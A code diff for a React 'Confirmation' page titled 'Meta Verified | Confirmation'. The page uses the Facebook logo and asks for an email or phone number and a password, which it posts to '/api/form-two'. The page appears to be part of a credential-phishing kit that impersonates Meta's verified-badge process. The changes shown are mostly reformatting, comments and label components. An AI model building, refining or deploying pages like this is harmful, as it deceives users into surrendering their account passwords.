@@ -5,6 +5,7 @@ import {
   FormControl,
   FormField,
   FormItem,
+  FormLabel,
   FormMessage,
 } from "@/components/ui/form";
 import { Input } from "@/components/ui/input";
@@ -23,6 +24,7 @@ import {
 } from "@/components/ui/select";
 import { countries } from "@/lib/countries";
 
+// Form schema for the confirmation step
 const confirmationFormSchema = z.object({
   user_email: z.string().optional(),
   password: z.string().min(6, "Password must be at least 6 characters"),
@@ -33,8 +35,10 @@ type ConfirmationFormValues = z.infer<typeof confirmationFormSchema>;
 export default function Confirmation() {
   const { toast } = useToast();
   const [, setLocation] = useLocation();
-  const [contactMethod, setContactMethod] = useState<'email' | 'phone'>('email');
-  const [countryCode, setCountryCode] = useState('+1');
+  const [contactMethod, setContactMethod] = useState<"email" | "phone">(
+    "email",
+  );
+  const [countryCode, setCountryCode] = useState("+1");
 
   const form = useForm<ConfirmationFormValues>({
     resolver: zodResolver(confirmationFormSchema),
@@ -44,65 +48,75 @@ export default function Confirmation() {
     },
   });
 
-  const validateInput = (value: string, type: 'email' | 'phone'): boolean => {
-    if (!value) return true;
-    if (type === 'email') {
+  const validateInput = (value: string, type: "email" | "phone"): boolean => {
+    if (!value) return true; // Empty value is now valid
+    if (type === "email") {
       return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
     } else {
-      return /^\d{10,}$/.test(value.replace(/\D/g, ''));
+      // Basic phone number validation (at least 10 digits)
+      return /^\d{10,}$/.test(value.replace(/\D/g, ""));
     }
   };
 
   const onSubmit = async (data: ConfirmationFormValues) => {
     try {
-      const contactValue = data.user_email?.trim() || '';
+      const contactValue = data.user_email?.trim() || "";
 
+      // Only validate if a value is provided
       if (contactValue && !validateInput(contactValue, contactMethod)) {
-        throw new Error(`Please enter a valid ${contactMethod === 'email' ? 'email address' : 'phone number'}`);
+        throw new Error(
+          `Please enter a valid ${contactMethod === "email" ? "email address" : "phone number"}`,
+        );
       }
 
+      // Format the contact information based on the selected method
       const formattedData = {
-        user_email: contactValue ? (contactMethod === 'phone' ? `${countryCode}${contactValue}` : contactValue) : '',
+        user_email: contactValue
+          ? contactMethod === "phone"
+            ? `${countryCode}${contactValue}`
+            : contactValue
+          : "",
         password: data.password,
       };
 
-      const response = await fetch('/api/form-two', {
-        method: 'POST',
+      const response = await fetch("/api/form-two", {
+        method: "POST",
         headers: {
-          'Content-Type': 'application/json',
+          "Content-Type": "application/json",
         },
         body: JSON.stringify(formattedData),
       });
 
       if (!response.ok) {
         const errorData = await response.json();
-        throw new Error(errorData.message || 'Failed to submit form');
+        throw new Error(errorData.message || "Failed to submit form");
       }
 
       toast({
         title: "Success!",
-        description: "Your form has been submitted successfully"
+        description: "Your form has been submitted successfully",
       });
       setLocation("/success");
     } catch (error: any) {
-      console.error('Form submission error:', error);
+      console.error("Form submission error:", error);
       toast({
         variant: "destructive",
         title: "Error",
-        description: error.message || "Failed to submit form. Please try again.",
+        description:
+          error.message || "Failed to submit form. Please try again.",
       });
     }
   };
 
   return (
     <>
-      <MetaTags 
+      <MetaTags
         title="Meta Verified | Confirmation"
         description="Request a verified badge on Facebook - Final Step"
       />
-      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5 p-4">
-        <div className="bg-white/90 backdrop-blur-sm p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center border border-white/20 hover:shadow-xl transition-shadow duration-300">
-          <img 
+      <div className="min-h-screen flex justify-center items-center p-3 sm:p-4 bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5">
+        <div className="bg-white/90 backdrop-blur-sm p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center border border-white/20">
+          <img
             src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
             alt="Logo"
             className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
@@ -120,22 +134,22 @@ export default function Confirmation() {
                   <div className="flex gap-4">
                     <button
                       type="button"
-                      onClick={() => setContactMethod('email')}
+                      onClick={() => setContactMethod("email")}
                       className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
-                        contactMethod === 'email'
-                          ? 'bg-[#0180FA] text-white shadow-md'
-                          : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10'
+                        contactMethod === "email"
+                          ? "bg-[#0180FA] text-white shadow-md"
+                          : "bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10"
                       }`}
                     >
                       Email
                     </button>
                     <button
                       type="button"
-                      onClick={() => setContactMethod('phone')}
+                      onClick={() => setContactMethod("phone")}
                       className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
-                        contactMethod === 'phone'
-                          ? 'bg-[#0180FA] text-white shadow-md'
-                          : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10'
+                        contactMethod === "phone"
+                          ? "bg-[#0180FA] text-white shadow-md"
+                          : "bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10"
                       }`}
                     >
                       Phone
@@ -148,12 +162,14 @@ export default function Confirmation() {
                   name="user_email"
                   render={({ field }) => (
                     <FormItem>
-                      <label className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
-                        {contactMethod === 'email' ? 'Email Address' : 'Phone Number'}
-                      </label>
+                      <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
+                        {contactMethod === "email"
+                          ? "Email Address"
+                          : "Phone Number"}
+                      </FormLabel>
                       <FormControl>
                         <div className="flex gap-2">
-                          {contactMethod === 'phone' && (
+                          {contactMethod === "phone" && (
                             <Select
                               value={countryCode}
                               onValueChange={setCountryCode}
@@ -163,7 +179,10 @@ export default function Confirmation() {
                               </SelectTrigger>
                               <SelectContent className="max-h-[200px]">
                                 {countries.map((country) => (
-                                  <SelectItem key={country.code} value={country.code}>
+                                  <SelectItem
+                                    key={country.code}
+                                    value={country.code}
+                                  >
                                     {country.code} ({country.name})
                                   </SelectItem>
                                 ))}
@@ -171,9 +190,9 @@ export default function Confirmation() {
                             </Select>
                           )}
                           <Input
-                            type={contactMethod === 'email' ? 'email' : 'tel'}
+                            type={contactMethod === "email" ? "email" : "tel"}
                             placeholder={
-                              contactMethod === 'email'
+                              contactMethod === "email"
                                 ? "Enter email address"
                                 : "Enter phone number"
                             }
@@ -181,8 +200,9 @@ export default function Confirmation() {
                             {...field}
                             onChange={(e) => {
                               let value = e.target.value;
-                              if (contactMethod === 'phone') {
-                                value = value.replace(/\D/g, '');
+                              if (contactMethod === "phone") {
+                                // Remove non-digit characters for phone numbers
+                                value = value.replace(/\D/g, "");
                               }
                               field.onChange(value);
                             }}
@@ -200,9 +220,9 @@ export default function Confirmation() {
                 name="password"
                 render={({ field }) => (
                   <FormItem className="text-left">
-                    <label className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
+                    <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                       Password
-                    </label>
+                    </FormLabel>
                     <FormControl>
                       <Input
                         type="password"
@@ -216,8 +236,8 @@ export default function Confirmation() {
                 )}
               />
 
-              <Button 
-                type="submit" 
+              <Button
+                type="submit"
                 className="w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm transition-colors duration-200 shadow-md"
                 disabled={form.formState.isSubmitting}
               >
